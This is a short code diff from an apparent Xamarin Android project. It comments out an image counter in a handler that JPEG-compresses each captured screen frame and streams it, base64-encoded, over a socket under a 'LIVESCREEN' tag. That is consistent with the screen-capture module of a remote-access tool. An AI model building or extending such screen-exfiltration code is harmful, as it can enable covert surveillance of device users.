@@ -38,7 +38,7 @@ namespace Task2
         {
             
         }
-        private static int IMAGES_PRODUCED = 0;
+        //private static int IMAGES_PRODUCED = 0;
         public void OnImageAvailable(ImageReader reader)
         {
             Android.Media.Image image = null;
@@ -63,7 +63,7 @@ namespace Task2
                         bitmap.Compress(Android.Graphics.Bitmap.CompressFormat.Jpeg, kalite, fos);
                         ((MainActivity)MainActivity.global_activity).soketimizeGonder("LIVESCREEN", $"[VERI]{Convert.ToBase64String(fos.ToArray())}[0x09]");
                         //System.IO.File.WriteAllBytes(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/myscreen_" + IMAGES_PRODUCED + ".jpg", fos.ToArray());
-                        IMAGES_PRODUCED++;
+                        //IMAGES_PRODUCED++;
                     }
                 }
 
